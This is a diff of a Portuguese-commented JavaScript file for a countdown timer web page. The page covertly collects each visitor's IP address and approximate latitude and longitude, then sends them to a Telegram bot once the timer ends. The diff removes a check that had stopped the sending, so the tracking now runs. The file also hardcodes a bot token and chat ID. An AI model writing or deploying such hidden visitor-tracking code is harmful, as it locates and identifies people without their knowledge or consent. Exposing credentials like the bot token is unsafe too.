@@ -1,6 +1,6 @@
-// script.js - Contagem Regressiva + Envia para Telegram (Vercel)
+// script.js - Timer + Envio para Telegram (com seu chat_id)
 
-let targetDate = new Date("2026-04-20T01:22:59").getTime();
+let targetDate = new Date("2026-04-20T01:28:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -8,39 +8,37 @@ let timerInterval = null;
 let alreadySent = false;
 
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
-const CHAT_ID = "8448614204";
+const CHAT_ID = "8448614204";   // Seu chat_id já configurado
 
 function sendToTelegram() {
-    if (alreadySent || !CHAT_ID || CHAT_ID === "8448614204") {
-        console.warn("chat_id não configurado ou já enviado.");
-        return;
-    }
+    if (alreadySent) return;
     alreadySent = true;
 
     const message = `🚨 Alguém acessou o timer!\n\n` +
-                    `IP: ${userIPv4 || 'não disponível'}\n` +
-                    `Latitude: ${userLatitude || 'não disponível'}\n` +
-                    `Longitude: ${userLongitude || 'não disponível'}\n\n` +
-                    `Horário: ${new Date().toLocaleString('pt-BR')}`;
+                    `IP: ${userIPv4 || 'Não capturado'}\n` +
+                    `Latitude: ${userLatitude || 'Não capturado'}\n` +
+                    `Longitude: ${userLongitude || 'Não capturado'}\n\n` +
+                    `Data/Hora: ${new Date().toLocaleString('pt-BR')}`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
+            text: message
         })
     })
     .then(res => res.json())
     .then(data => {
         if (data.ok) {
-            console.log("✅ Mensagem enviada para o Telegram com sucesso!");
+            console.log("✅ Mensagem enviada com sucesso para o Telegram!");
         } else {
-            console.error("❌ Erro ao enviar para Telegram:", data);
+            console.error("❌ Telegram API Error:", data.description);
         }
     })
-    .catch(err => console.error("Erro na requisição Telegram:", err));
+    .catch(err => {
+        console.error("❌ Erro ao conectar com Telegram:", err);
+    });
 }
 
 function updateTimer() {
@@ -58,7 +56,7 @@ function updateTimer() {
             Não é magia, é habilidade isto...
         `;
 
-        sendToTelegram();   // ← Envia para o seu PV
+        sendToTelegram();   // Envia as infos pro seu Telegram
         return;
     }
 
@@ -85,7 +83,7 @@ fetch('https://api.ipify.org?format=json')
         userLatitude = data.latitude || '';
         userLongitude = data.longitude || '';
     })
-    .catch(err => console.error(err));
+    .catch(err => console.error("Erro ao pegar localização:", err));
 
 timerInterval = setInterval(updateTimer, 100);
 updateTimer();
